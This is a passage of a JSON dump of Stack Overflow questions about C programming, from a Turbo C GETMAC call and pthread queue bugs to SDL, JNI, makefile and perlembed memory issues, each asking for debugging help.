language?","body":"<p>Please find below the code and the output which I am getting.</p>\n\n<p>My C code is in <code>c:/turboc3/bin</code> directory\nand my output <code>macid.txt</code> is in <code>c:/turboc3/disk</code>.</p>\n\n<p>Here is the code which I am compiling</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;conio.h&gt;\n#include &lt;string.h&gt;\n\nint main ()\n{\n    //char mac[200];\n    FILE *fp;\n    clrscr();\n    // fp=fopen(\"c:\\macid.txt\",\"w\");\n    system(\"GETMAC&gt;c:/macid.txt\");\n    fp=fopen(\"c:/macid.txt\",\"r\");\n    if(fp!=NULL)\n    {\n        char line[128];\n        while(fgets(line,sizeof line,fp)!=NULL)\n        {\n            char *nwln=strchr(line,'\\n');\n            char *ptr;\n            if(nwln!=NULL)\n                *nwln='\\0';\n            ptr=strstr(line,\"Physical Address\");\n            if(ptr!=NULL)\n            {\n                printf(\"%s\\n\",ptr);\n                break;\n            }\n        }\n    }\n    getch();\n    return 0;\n}\n</code></pre>\n\n<p>The output is:</p>\n\n<pre><code>Illegal command: GETMAC.\n</code></pre>\n\n<p>Can anyone guide me through this?</p>\n"},{"tags":["c++","c","return"],"answer_count":8,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":92,"score":1,"question_id":13205941,"title":"What's the meaning of the return value of int main(), and how to display it?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/204476/what-should-main-return-in-c-c\">What should main() return in C/C++?</a>  </p>\n</blockquote>\n\n\n\n<p>I have this simple program in C:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n  return 8;\n}\n</code></pre>\n\n<p>What's the meaning of the return value, and how to display it, or how to use it?</p>\n"},{"tags":["c","assembly","macros","make"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13206274,"title":"Linking .a51 file to C","body":"<p>In a C file i am having a macro as given below</p>\n\n<pre><code>#define h2_write(block, subblock, addr, value) \\\n   h2_write_addr((block), (subblock), (addr)); \\\n   h2_write_((value))\n</code></pre>\n\n<p>Its definition is in a .a51 file as shown below</p>\n\n<pre><code>void h2_write_addr (uchar block, uchar subblock, uchar addr) ;\n\n_h2_write_addr:\n        mov     a, r7             ; Get block\n        add     a, r5             ; Add subblock\n        mov     write_block, a\n        mov     write_reg, r3\n        ret\n</code></pre>\n\n<p>While compiling showing linker error as \"undefined reference h2_write_addr\".\nSo how can I link .a51 file to the c file</p>\n"},{"tags":["c","pthreads","malloc","dynamic-memory-allocation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13206340,"title":"malloc.c error when using a struct and multiple threads","body":"<p>I am getting an error which I have no idea how to fix. I am trying to work through the \"producer-consumer\" problem using  spin-lock. I created a \"Queue\"-like data structure as a shared resource to put \"produced\" items in, and to remove items to be \"consumed\". This is what my main program looks like:</p>\n\n<pre><code>#include &lt;pthread.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;time.h&gt;\n#include \"Queue.h\"\n\n#define DEBUG 1\n\nQueue_t* global_queue; // create a global queue\n\n/* thread procedure for the producer thread */\nvoid* producer_func(void* arg)\n{\n   while(1) // loops infinitely\n   {\n      int datum = rand() % global_queue-&gt;maximum_count;\n\n      // spin while the queue is full\n      while ((global_queue-&gt;current_count) ==\n         (global_queue-&gt;maximum_count));\n\n      enqueue(global_queue, datum);\n      display(global_queue);\n   }\n}\n\n\n/* thread procedure for the consumer thread */\nvoid* consumer_func(void* arg)\n{\n   while(1) // loops infinitely\n   {\n      int datum = 0;\n\n      // spin while there are no items in the queue\n      while(global_queue-&gt;current_count == 0);\n\n      datum = dequeue(global_queue);\n      printf(\"The number consumed is %d\\n\");\n   }\n}\n\n\n/* Main */\nint main(int argc, char** argv)\n{\n   if(argc != 2)\n   {\n      printf(\"Error: wrong number of command-line arguments\\n\");\n      printf(\"Usage: %s &lt;integer&gt;\\n\", argv[0]);\n      exit(1);\n   }\n\n   pthread_t producer;  // create producer thread\n   pthread_t consumer;  // create consumer thread\n\n   // create the queue object, get the max queue size\n   //int max_count = atoi(argv[1]);\n   global_queue = construct(10);\n   display(global_queue);\n\n   // intialize the random seed generator\n   srand((unsigned)time(NULL));\n\n   // create the threads and have them execute their routines\n   pthread_create(&amp;producer, NULL, &amp;producer_func, NULL);\n   pthread_create(&amp;consumer, NULL, &amp;consumer_func, NULL);\n\n   // join the threads to finish\n   pthread_join(producer, NULL);\n   pthread_join(consumer, NULL);\n\n   // deallocate the queue from memory\n   //destruct(global_queue);\n\n   return 0;\n}\n</code></pre>\n\n<p>However, when I call the pthread_create in main routine, I get a bizarre error in malloc.c:</p>\n\n<pre><code>queue_demo: malloc.c:3096: sYSMALLOc: Assertion `(old_top == (((mbinptr) (((char *) &amp;((av)-&gt;bins[((1) - 1) * 2])) - __builtin_offsetof (struct malloc_chunk, fd)))) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= (unsigned long)((((__builtin_offsetof (struct malloc_chunk, fd_nextsize))+((2 * (sizeof(size_t))) - 1)) &amp; ~((2 * (sizeof(size_t))) - 1))) &amp;&amp; ((old_top)-&gt;size &amp; 0x1) &amp;&amp; ((unsigned long)old_end &amp; pagemask) == 0)' failed.\nAborted\n</code></pre>\n\n<p>Here is my \"Queue\" data structure header file:</p>\n\n<pre><code>#ifndef QUEUE_H\n#define QUEUE_H\n\ntypedef struct Queue\n{\n   int  current_count;\n   int  maximum_count;\n   int  buffer[];       // queue uses an array\n} Queue_t;\n\n\n// routines to implement Queue-like functionality (FIFO)\n// TODO: somehow encapsulate all these features in the struct itself.\n//\nQueue_t* construct(int buff_size);\nvoid     destruct (Queue_t* queue);\nvoid     display  (Queue_t* queue);\nint      dequeue  (Queue_t* queue);\nvoid     enqueue  (Queue_t* queue, const int datum);\n\n#endif\n</code></pre>\n\n<p>And implementation:</p>\n\n<pre><code>#include &lt;assert.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include \"Queue.h\"\n\nQueue_t* construct(int buff_size)\n{\n   Queue_t* queue = malloc(sizeof(Queue_t));\n\n   assert(queue != NULL);\n   queue-&gt;maximum_count = buff_size;\n   queue-&gt;current_count = 0;\n\n   int i = 0;\n\n   for(; i &lt; queue-&gt;maximum_count; ++i)\n      queue-&gt;buffer[i] = 0;\n\n   return queue;\n}\n\nvoid destruct(Queue_t* queue)\n{\n   assert(queue != NULL);\n   free(queue);\n   printf(\"Queue destroyed!\\n\");\n}\n\nvoid display(Queue_t* queue)\n{\n   int i = 0;\n\n   for(; i &lt; queue-&gt;maximum_count; ++i)\n      printf(\"%d \", queue-&gt;buffer[i]);\n   printf(\"\\n\");\n}\n\nvoid enqueue(Queue_t* queue, const int datum)\n{\n   assert(queue-&gt;current_count &lt; queue-&gt;maximum_count);\n   queue-&gt;buffer[queue-&gt;current_count] = datum;\n   ++queue-&gt;current_count;\n}\n\n\nint dequeue(Queue_t* queue)\n{\n   int i = 1;\n   int datum = queue-&gt;buffer[0];\n\n   assert(queue-&gt;current_count &gt; 0);\n\n   for(; i &lt; queue-&gt;maximum_count; ++i)\n   {\n      queue-&gt;buffer[i-1] = queue-&gt;buffer[i];\n      queue-&gt;buffer[i] = 0;\n   }\n\n   --queue-&gt;current_count;\n\n   return datum;\n}\n</code></pre>\n\n<p>Clearly, I am doing something very wrong. But I have no idea what exactly that is. I suspect it may have something to do with declaring the struct globally, but I am not sure. Any ideas  would be greatly appreciated.</p>\n"},{"tags":["c","zookeeper"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":32,"score":-4,"question_id":13206454,"title":"About zookeeper programming with c language, what's wrong","body":"<pre><code>#include &lt;iostream&gt;\n#include &lt;unistd.h&gt;\n#include &lt;zookeeper/zookeeper.h&gt;\n\nvoid watcher(zhandle_t *zzh, int type, int state, const char *path, void *watcherCtx) \n{\n    std::cerr &lt;&lt; \"watcher\" &lt;&lt; std::endl;\n}\n\nint main(int argc, char* const argv[])\n{\n    zhandle_t *zoo = NULL;\n\n    zoo = zookeeper_init(\"localhost:2181\", watcher, 100000, NULL, NULL, 0);\n\n    if (!zoo)\n    {\n        return 1;\n    }\n\n    char path_buf[1024];\n\n    int ret = zoo_create(zoo, \"/hello\", \"test_value\", 9, &amp;ZOO_OPEN_ACL_UNSAFE, 0, path_buf, 1024);\n\n    if (ret == ZOK)\n    {\n#if 0\n        struct Stat stat;\n        int buflen = 1024;\n\n        ret = zoo_get(zoo, \"/hello\", 1, path_buf, &amp;buflen, &amp;stat);\n\n        if (ret == ZOK)\n        {\n            std::cerr &lt;&lt; \"node get \" &lt;&lt; path_buf &lt;&lt;  \"(len=\" &lt;&lt; buflen &lt;&lt; \"), go to sleep\" &lt;&lt; std::endl;\n        }\n#endif\n        std::cerr &lt;&lt; \"zoo_create OK\" &lt;&lt; std::endl;\n    }\n\n    zookeeper_close(zoo);\n\n    return 0;\n}\n</code></pre>\n\n<p>I tried to create a new znode like this, and it return ZOK, but i can't get the znode either in this program or in cli_st, the infomation is like :</p>\n\n<pre><code>2012-11-03 13:58:31,751:27800:ZOO_INFO@log_env@712: Client environment:zookeeper.version=zookeeper C client 3.4.4\n2012-11-03 13:58:31,751:27800:ZOO_INFO@log_env@716: Client environment:host.name=vps616\n2012-11-03 13:58:31,751:27800:ZOO_INFO@log_env@723: Client environment:os.name=Linux\n2012-11-03 13:58:31,751:27800:ZOO_INFO@log_env@724: Client environment:os.arch=2.6.32-220.el6.x86_64\n2012-11-03 13:58:31,751:27800:ZOO_INFO@log_env@725: Client environment:os.version=#1 SMP Tue Dec 6 19:48:22 GMT 2011\n2012-11-03 13:58:31,752:27800:ZOO_INFO@log_env@733: Client environment:user.name=root\n2012-11-03 13:58:31,752:27800:ZOO_INFO@log_env@741: Client environment:user.home=/root\n2012-11-03 13:58:31,752:27800:ZOO_INFO@log_env@753: Client environment:user.dir=/root/code/zoo\n2012-11-03 13:58:31,752:27800:ZOO_INFO@zookeeper_init@786: Initiating client connection, host=localhost:2181 sessionTimeout=100000 watcher=0x400954 sessionId=0 sessionPasswd=&lt;null&gt; context=(nil) flags=0\nzoo_create OK\n2012-11-03 13:58:31,752:27800:ZOO_INFO@zookeeper_close@2522: Freeing zookeeper resources for sessionId=0\n</code></pre>\n\n<p>The cli_st shows that:</p>\n\n<pre><code>ls /\ntime = 0 msec\n/: rc = 0\n        xxx h\n        new_node\n        zookeeper\ntime = 0 msec\n</code></pre>\n\n<p>but i can create znode with cli_st correctly, what's wrong with my code?</p>\n"},{"tags":["c","strcmp","strcpy"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13206158,"title":"Deleting information within an application in C","body":"<p>Ive got a phonebook app that the user can enter in contact information, and it will show up in the phonebook. I have a delete function that allows the user to search via the last name and delete the contact from the phonebook. My issue is that when I search the last name to delete the contact, not only that contact, but also all the contacts that follow it.</p>\n\n<pre><code>void delete_contact(fr*friends ,int* counter, int i)\n{\n    char name_search[50]={'\\0'};\n    char Delete[5]={'\\0'};\n\n     printf(\"Search by last name\\n\");\n     scanf(\"%s\",name_search);\n     for(i=0;i&lt;*counter;i++)\n      {\n       if(strcmp(name_search,friends[i].Last_Name)==0)\n       {\n       strcpy(friends[i].Last_Name,Delete);\n       (*counter)--;\n\n      } \n    }                                        \n }\n</code></pre>\n\n<p>Now I realize that I will need to write a few more <code>strcpy</code> functions to overwrite the rest of the info within the contact connected to the last name, but right now I need to figure out why it's deleting all other names following in the phonebook. Ideas?</p>\n\n<p>I can post more code or my output if needed. Thanks</p>\n"},{"tags":["c","function","opengl","pointers"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":35,"score":-2,"question_id":13205451,"title":"Print values from file or pointer in C with openGL","body":"<p>I need to print 2 vector in openGL but I cannot sent a pointer with the function <code>glutDisplayFunc</code>.</p>\n\n<p><code>glutDisplayFunc(graphfunct)</code> I have this once the window is created but I need send the 2 pointers with the address of vector to set the coordinates.</p>\n"},{"tags":["c","memory","assertion"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":13205126,"title":"Can't figure out why my program is asserting","body":"<p>I'm working on an simple vector program as an assignment, but I cant figure out my why program asserts. My program compiles successfully, but fails at runtime. I think im at the reach of expertise on this one.</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;assert.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;iomanip&gt;\n#define TESTING\nusing namespace std;\ntypedef float Elem;//floats for vector elements\n\nstruct Vector{//structure for the vector\n    unsigned int size;\n    Elem *svector;\n};\n\n\nint main(){\n\n#ifdef TESTING\n        //prototypes\n    Vector *alloc_vec();\n    bool print_vec(Vector *printVector);\n    Vector *extend_vec(Vector *extend,Elem element);\n    Vector *scalar_plus(Vector *vecToAdd, Elem addElement);\n    void dealloc_vec(Vector *&amp;deAlloc);\n\n    //testing scaffolds\n    Vector *testVec=new Vector;\n    *testVec=*alloc_vec();\n    assert(testVec-&gt;size==0);\n    assert(testVec-&gt;svector==NULL);\n\n    for(int i=0;i=10;i++){\n        *testVec=*extend_vec(testVec,Elem(i));\n    }\n\n    assert(testVec-&gt;size!=0);\n    assert(testVec-&gt;svector!=NULL);\n\n    assert(print_vec(testVec));\n    print_vec(testVec);\n\n    *testVec=*scalar_plus(testVec,5);\n\n    print_vec(testVec);\n\n    dealloc_vec(testVec);\n\n    assert(testVec==NULL);\n#endif //testing\n\n    return 0;\n}\n\nVector *alloc_vec(){//constructor to allocate an empty (zero-length) vector\n    Vector *newVector=new Vector; //initiatizes a new vector\n        if (newVector==NULL){\n        return NULL;\n    }\n\n    newVector-&gt;size=0;//sets length to 0 \n    newVector-&gt;svector=NULL;//sets vector to null\n\n\n    return newVector;\n}\n\nbool print_vec(Vector *printVector){\n\n    if(printVector==NULL){//makes sure printVector exists to pass unit test 1\n        return false;\n    }\n\n    for(unsigned int i=0; i&lt;printVector-&gt;size;i++){\n        cout&lt;&lt;printVector-&gt;svector[i]&lt;&lt;endl;\n    }\n\n    return true;\n\n}\n\nvoid dealloc_vec(Vector *deAlloc){\n    if (deAlloc==NULL){//if the vector contains no memory, no need to deallocate, unit test#1\n        return;}\n\n    delete deAlloc;//clears the memory of the vector\n    deAlloc=NULL;\n    return;\n\n}\n\nVector *extend_vec(Vector *extend,Elem element){\n    if (extend==NULL){\n        return NULL;}\n\n\n    Elem *tempVec=new Elem[extend-&gt;size+1];//sets up a temp vector one size larger\n    tempVec[extend-&gt;size]=element;\n\n    memcpy(tempVec,extend-&gt;svector,(extend-&gt;size*sizeof(Elem)));//copies the memory from the original array to the rest of the temp array\n\n        extend-&gt;size+=1;\n\n    delete[] extend-&gt;svector;//clears the memory\n\n    extend-&gt;svector=tempVec;//the original vector now becomes the extended vector\n\n    delete[] tempVec;//clears the temporary memory\n\n        return extend;\n}\n\nVector *scalar_plus(Vector *vecToAdd, Elem addElement){\n    if (vecToAdd==NULL){\n        return NULL;}\n    for(unsigned int i=0;i&lt;vecToAdd-&gt;size;i++){//adds a scalar to each element \n        vecToAdd-&gt;svector[i]+=addElement;\n        }\n\n        return vecToAdd;\n}\n</code></pre>\n\n<p>**EDIT\nSome people asked me which assertion error I got:</p>\n\n<p>Debug Assertion Failed!</p>\n\n<p>Program:\n...12\\Projects\\ConsoleApplication2\\Debug\\ConsoleApplication2.exe</p>\n\n<p>File:f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\dggdel.cpp</p>\n\n<p>Line:52</p>\n\n<p>Expression:_BLOCK_TYPE_IS_VALID(pHead->nBlockUse)</p>\n\n<p>I've also made the following changes:\n    assert(testVec=NULL)\n    (deAlloc==NULL)</p>\n\n<p>to</p>\n\n<pre><code>assert(testVec==NULL)\n(deAlloc==NULL)\n</code></pre>\n\n<p>this function from:\n    void dealloc_vec(Vector *deAlloc)</p>\n\n<p>to:</p>\n\n<p>void dealloc_vec(Vector *&amp;deAlloc)</p>\n\n<p>Assertion error fixed, however doesnt produce output. Still working on the debugging.</p>\n\n<p>Also, quite possible this is more C than C++. My prof states in the assignment spec that this is C++, but he switches between the two lots in our class.</p>\n"},{"tags":["c"],"answer_count":5,"favorite_count":6,"up_vote_count":22,"down_vote_count":0,"view_count":2086,"score":22,"question_id":51561,"title":"How do I automate finding unused #include directives?","body":"<p>Typically when writing new code you discover that you are missing a #include because the file doesn't compile. Simple enough, you add the required #include. But later you refactor the code somehow and now a couple of #include directives are no longer needed. How do I discover which ones are no longer needed? </p>\n\n<p>Of course I can manually remove some or all #include lines and add them back until the file compiles again, but this isn't really feasible in a large project with thousands of files. Are there any tools available that will help automating task?</p>\n"},{"tags":["c","sdl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13205379,"title":"SDL_PollEvent not triggering","body":"<p>I've only recently started working in C and using SDL, so I'm sure it's something basic that I mess up, but every example code I can find looks like mine, except mine doesn't work. So any help would be welcomed.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;SDL.h&gt;\n\nint main(int argc, char *argv[])\n{\nSDL_Event event;\nint game_running = 1;\nwhile (game_running)\n{\n    while (SDL_PollEvent(&amp;event))\n    {\n        switch (event.type) /* checking for event type */\n        {\n            case SDL_KEYDOWN:\n                switch(event.key.keysym.sym)\n                {\n                    case SDLK_UP:\n                        printf(\"You pressed up.\\n\");\n                        break;\n                    case SDLK_DOWN:\n                        printf(\"You pressed down.\\n\");\n                        break;\n                }\n                break;\n            case SDL_KEYUP:\n                printf(\"You stopped pressing the button.\\n\");\n                break;\n            case SDL_QUIT:\n                game_running=0;\n                break;\n        }\n    }\n}\nSDL_Quit();\nprintf(\"The program stopped.\");\n\nreturn 0;\n}\n</code></pre>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13205938,"title":"How do I print to stdout in proper columns?","body":"<p>I have a program where I am printing to a file, and I would like to print my columns in steady columns.</p>\n\n<p>You can see here by looking at the output of my file what I am trying to say</p>\n\n<p>Output: <a href=\"http://nopaste.dk/p15072\" rel=\"nofollow\">http://nopaste.dk/p15072</a></p>\n\n<p>Here is what I wrote:</p>\n\n<pre><code>int func1(int n) {\n        if(n==0){return(6);}\n    return ((int)log2(n));\n}\nchar levelStrings[7] = {'L','M','H','E','F','C','X'};\nfprintf(fp, \"%s  %s  %d   %c    \",tString+11,log-&gt;file,log-&gt;line,levelStrings[func1(log-&gt;ssMask%64)]);\n</code></pre>\n\n<p>Thanks so much!</p>\n\n<p>(sorry that i cannot provide the input data, as they are Hex info that I have made a parser for, and it is just too much code to paste. I hope you get the general idea of what I am trying to do.)</p>\n"},{"tags":["c","opengl","tcc"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":435,"score":0,"question_id":7882871,"title":"OpenGL + Tiny C Compiler: \", expected\"","body":"<p>I am working on a program and am using Tiny C Compiler with SDL and OpenGL. TCC doesn't include headers for opengl, so I tried copying them from both Visual C++ and MinGW. Both of them fail to compile with the following error:</p>\n\n<p><code>v:/exe/tcc/include//GL/gl.h:1081: ',' expected</code></p>\n\n<p>Line 1081 in both files is:</p>\n\n<pre><code>GLAPI void APIENTRY glVertex4s( GLshort x, GLshort y, GLshort z, GLshort w );\nGLAPI void APIENTRY glVertex2dv( const GLdouble *v ); // &lt;-- line 1081\nGLAPI void APIENTRY glVertex2fv( const GLfloat *v );\n</code></pre>\n\n<p>Expansion for GLAPI:</p>\n\n<pre><code>/* GLAPI, part 1 (use WINGDIAPI, if defined) */\n#if defined(__WIN32__) &amp;&amp; defined(WINGDIAPI)\n#  define GLAPI WINGDIAPI\n#endif\n\n/* GLAPI, part 2 */\n#if !defined(GLAPI)\n#  if defined(_MSC_VER)                        /* Microsoft Visual C++ */\n#    define GLAPI __declspec(dllimport)\n#  elif defined(__LCC__) &amp;&amp; defined(__WIN32__) /* LCC-Win32 */\n#    define GLAPI __stdcall\n#  else                                        /* Others (e.g. MinGW, Cygwin, non-win32) */\n#    define GLAPI extern\n#  endif\n#endif\n</code></pre>\n\n<p>Expansion for APIENTRY:</p>\n\n<pre><code>/* APIENTRY */\n#if !defined(APIENTRY)\n#  if defined(__WIN32__)\n#    define APIENTRY __stdcall\n#  else\n#    define APIENTRY\n#  endif\n#endif\n</code></pre>\n\n<p>The only compiler flags I am setting are -b, -g, -Wall, and a few include directories.</p>\n\n<p>Can I have some assistance with this? I will be happy to provide more information if needed.</p>\n"},{"tags":["c","makefile"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13205865,"title":"gcc - file not recognized: File format not recognized","body":"<p>I'm trying to get a small project compiled but am getting this error, I've been searching around and people get this error mainly because of incorrect file extension, but I don't really think that's the cause here:</p>\n\n<pre><code>gcc -c -W -Wall -ggdb -I. router.c -o router.o\nrouter.c:106: warning: unused parameter ‘hname’\nrouter.c: In function ‘flood_neighbors’:\nrouter.c:464: warning: unused variable ‘bytes_rcvd’\nrouter.c: At top level:\nrouter.c:536: warning: unused parameter ‘fd’\ngcc -c -W -Wall -ggdb -I. link_info.h -o link_info.o\ngcc -c -W -Wall -ggdb -I. route.h -o route.o\ngcc -c -W -Wall -ggdb -I. sequence.h -o sequence.o\ngcc -W -Wall -ggdb -I. router.o link_info.o route.o sequence.o -o router\nlink_info.o: file not recognized: File format not recognized\ncollect2: ld returned 1 exit status\nmake: *** [router] Error 1\n</code></pre>\n\n<p>and my make file looks like:</p>\n\n<pre><code>CC = gcc\nINC = -I.\nFLAGS = -W -Wall -ggdb\n\nrouter: router.o link_info.o route.o sequence.o\n        $(CC) $(FLAGS) $(INC) $^ -o $@\n\nrouter.o: router.c\n        $(CC) -c $(FLAGS) $(INC) $&lt; -o $@\n\nsequence.o: sequence.h sequence.h\n        $(CC) -c $(FLAGS) $(INC) $&lt; -o $@\n\nlink_info.o: link_info.h link_info.c\n        $(CC) -c $(FLAGS) $(INC) $&lt; -o $@\n\nroute.o: route.h route.c\n        $(CC) -c $(FLAGS) $(INC) $&lt; -o $@\n</code></pre>\n\n<p>What I'm confused on is the rules for three object files are of the same format, but why only the link one yells? Thanks a lot!</p>\n"},{"tags":["android","c","android-ndk","jni"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":1094,"score":2,"question_id":10383458,"title":"Returning jbyteArray from native c in Android","body":"<p>I use native c to read data from an audio file to jbyte pointer. Now i want to send it to java as an jbyteArray. </p>\n\n<pre><code>jbyteArray Java_com_app_audio_player_readData(JNIEnv * env, jobject jobj,jstring readPath)\n{\n\nFILE *fin;\nconst char *inFile= (*env)-&gt;GetStringUTFChars(env,readPath,0);\nfin = fopen(inFile, \"r\");\n\nfseek(fin, 0, SEEK_END); // seek to end of file\n int size = ftell(fin); // get current file pointer\nfseek(fin, 0, SEEK_SET);\n\njbyte *data=(jbyte *)malloc(size*sizeof(jbyte));\nint charCnt = 0;\n\ncharCnt=fread(data, 1, size, fin);\n\n\njbyteArray result=(*env)-&gt;NewByteArray(env, size);\n\n     //-- I want to convert data to jbyteArray and return it to java    \n\nfclose(fin);\n return result;\n\n}\n</code></pre>\n\n<p>How it is done?</p>\n"},{"tags":["c","mikroc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":222,"score":-4,"question_id":8640307,"title":"Difference between ByteToStr IntToStr","body":"<p>I am trying to write program in <code>C</code>. </p>\n\n<p>I read the rules for functions which are used for conversion types.  I know which are the inputs and destination types in functions. but I have a problem, I couldn't understand when I use some of them, when do we use <code>ByteToStr</code> or <code>IntToStr</code>.</p>\n\n<p>Any suggestion?</p>\n"},{"tags":["c"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":186,"score":0,"question_id":8665758,"title":"Trying to compare two strings ","body":"<p>It is sufficient to say that I am new to C so please have show some mercy ;). </p>\n\n<p>I'm trying to compare two strings. The output shouldn't contain common characters. Sadly it does.</p>\n\n<p>Here is the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void) \n{\n    const char msg[15] = \"blueberry\";\n    int c;\n    int s[15];\n    int j = 0;\n    int i = 0;\n    int k= 0;\n    int ok = 0;\n    int t = 0;\n\n    while (i &lt; 15 &amp;&amp; (c = getchar()) != '\\n')\n    {\n        s[i] = c;\n        ++i;\n    }\n\n    for (t=j=0; t &lt; 15; ++t)\n    {\n        ok = 1;\n        //printf (\"%c\", s[t]);\n    }\n\n    for (k=0; msg[k] != '\\0'; ++k)\n    {\n        if (s[t] == msg[k]) \n        {\n            ok = 0;\n        }\n    }\n\n    if (ok == 1)\n    {\n        s[j] = s[t];\n        j++;\n    }\n    s[j] = '\\0';\n\n    for (j = 0; j &lt; 15; ++j)\n        printf (\"%c \", s[j]);\n}\n</code></pre>\n\n<p>The input from the keyboard is <code>blackberry</code>, expected output should've been <code>U</code> but sadly it is not. Any help please. Also why is it entering the nested <code>for</code> loop irrespective of condition?</p>\n\n<hr>\n\n<p>My big thanks to everyone, it helped me a lot. I've figured out a way &amp; am ok with the output. I've borrowed some ideas from A4L :).</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":4,"view_count":69,"score":-2,"question_id":13205508,"title":"C variable initialization by default","body":"<p>In C, why does the following result in x[1] being 2?</p>\n\n<pre><code>int a = 2, x;\n...\nprintf(\"x[1] = \", &amp;x[1])\n</code></pre>\n"},{"tags":["c","perl","xs"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13169768,"title":"perlembed/perlcall example unbounded memory growth - valgrind says no leaks possible","body":"<p>all. I've been banging my head up against this one for a while... I'm trying to put together an example of basically perlembed + perlcall and more or less \"borrowed\" it from evpsgi. The problem is that it grows about 1MB in size for every 1000 iterations. This isn't the greatest situation to be in when running in a long lived process (which is the use case that I'm working with).</p>\n\n<p>As the title states, if I run with valgrind it reports that there are no leaks possible. I ran with --trace-malloc=yes and it appears that free is only ever called at the end in a big batch of calls. I understand that this may be perl's MO but it would be nice if it at least re-used the memory and didn't grow until the OS killed off the process.</p>\n\n<p>The entry for sv_2mortal mentions something about the buffer being available to be \"stolen\" but I've peppered the code with calls to sv_2mortal but there was no change.</p>\n\n<p>Without further ado, here is the code. Please forgive the cargo cultishness of it. Thanks in advance!</p>\n\n<pre><code>/*\n *\n * cc `perl -MExtUtils::Embed -e ccopts -e ldopts` -Wall -ggdb test_perl_2.c -o test_perl_2\n *\n * # test.psgi\n * use strict;\n * use warnings;\n * my $app = sub  {\n *     return [ 200, [ test =&gt; 1 ], [ sprintf( \"%d: Hello!!! from %s\\n\", $$, __FILE__ ) ] ];\n * };\n *\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;EXTERN.h&gt;               /* from the Perl distribution     */\n#include &lt;perl.h&gt;                 /* from the Perl distribution     */\n\nstatic PerlInterpreter *perlinterp;  /***    The Perl interpreter    ***/\nstatic SV *app;\n\nvoid do_stuff( void );\nSV * get_stuff( void );\nSV * call_stuff( SV * );\n\nEXTERN_C void xs_init( pTHX );\nEXTERN_C void boot_DynaLoader (pTHX_ CV* cv);\nEXTERN_C void xs_init( pTHX ) {\n    char *file = __FILE__;\n    dXSUB_SYS;\n    /* DynaLoader is a special case */\n    newXS(\"DynaLoader::boot_DynaLoader\", boot_DynaLoader, file);\n}\n\nint main( int argc, char **argv, char **env ) {\n    char code[ 1024 ];\n    char psgi[] = \"test.psgi\";\n    char *embedding[] = { \"\", \"-e\", \"0\" };\n\n    PERL_SYS_INIT3( &amp;argc, &amp;argv, &amp;env );\n    perlinterp = perl_alloc();\n    PERL_SET_CONTEXT( perlinterp );\n    perl_construct( perlinterp );\n    perl_parse( perlinterp, xs_init, 3, embedding, (char **)NULL );\n    PL_exit_flags |= PERL_EXIT_DESTRUCT_END;\n\n    sprintf( code, \"do '%s' or die $@\", psgi );\n    app = eval_pv( code, TRUE ); /* croak_on_error */\n\n    do_stuff();\n\n    PL_perl_destruct_level = 1;\n    perl_destruct( perlinterp );\n    perl_free( perlinterp );\n    PERL_SYS_TERM();\n    return 0;\n}\n\nvoid do_stuff( void ) {\n    int body_lastindex, i, count;\n    AV *response_av, *body_av;\n    SV *stuff_sv, *response_sv, *status, *tmp_body_sv, *body_sv;\n\n//  count = 10000;\n    count = 10;\n    while( count-- ) {\n\n        ENTER;\n        SAVETMPS;\n\n        stuff_sv = get_stuff();\n        response_sv = call_stuff( stuff_sv );\n\n        if(\n            NULL == response_sv ||\n            ! SvROK( response_sv ) ||\n            SvTYPE( SvRV( response_sv ) ) != SVt_PVAV\n        ) {\n            printf( \"NULL == response_sv\\n\" );\n            goto CLIENT_END;\n        }\n\n        response_av = (AV *)SvRV( response_sv );\n\n        status = *av_fetch( response_av, 0, 0 );\n        printf( \"status = %ld\\n\", (long)SvIV( status ) );\n\n        body_av = (AV *)SvRV( *av_fetch( response_av, 2, 0 ) );\n\n        body_sv = newSV( 0 );\n\n        body_lastindex = av_len( body_av );\n        for( i = 0; i &lt;= body_lastindex; i++ ) {\n            tmp_body_sv = (SV *)*av_fetch( body_av, i, 0 );\n            if( SvOK( tmp_body_sv ) ) {\n                sv_catsv( body_sv, tmp_body_sv );\n            }\n        }\n        printf( \"body_sv = %s\\n\", SvPV_nolen( body_sv ) );\n\nCLIENT_END:\n        FREETMPS;\n        